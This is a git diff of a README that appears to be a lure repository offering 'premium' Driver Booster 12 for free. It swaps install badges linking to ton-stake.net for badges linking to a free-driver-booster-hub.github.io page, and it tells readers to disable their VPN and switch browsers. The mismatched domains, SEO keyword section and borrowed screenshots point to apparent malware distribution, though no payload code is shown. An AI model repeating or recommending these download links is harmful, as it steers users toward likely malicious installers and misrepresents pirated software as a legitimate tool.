@@ -5,7 +5,9 @@
 
 **Description**: Optimize your PC with **Driver Booster 12**, a premium tool for updating drivers and boosting performance! This repository offers tutorials, resources, and tips to explore Driver Booster‚Äôs features for enhancing system stability and gaming. Start with accessible driver tools and join our community of tech enthusiasts in 2025!  
 
-[![Install Driver Booster 12](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-driver-booster-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -33,7 +35,9 @@ Boost your PC performance with these simple steps to set up Driver Booster 12! 
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother experience.  
 
-[![Install Driver Booster 12](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-driver-booster-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -91,12 +95,10 @@ Boost your PC performance with these simple steps to set up Driver Booster 12! 
 
 **Driver Booster 12 Interface**  
 ![Driver Booster 12 Interface](https://imag.malavida.com/mvimgbig/download-fs/driver-booster-13563-3.jpg)  
-*Sleek workspace for driver optimization.*  
-
+ 
 **Performance Tools**  
 ![Performance Tools](https://filecr.com/_next/image/?url=https%3A%2F%2Fmedia.imgcdn.org%2Frepo%2F2023%2F03%2Fiobit-driver-booster%2F662a21fdcdb35-iobit-driver-booster-screenshot1.webp&w=1920&q=75)  
-*Enhance your PC with advanced features.*  
-
+ 
 ---
 
 ## üîç SEO Keywords  
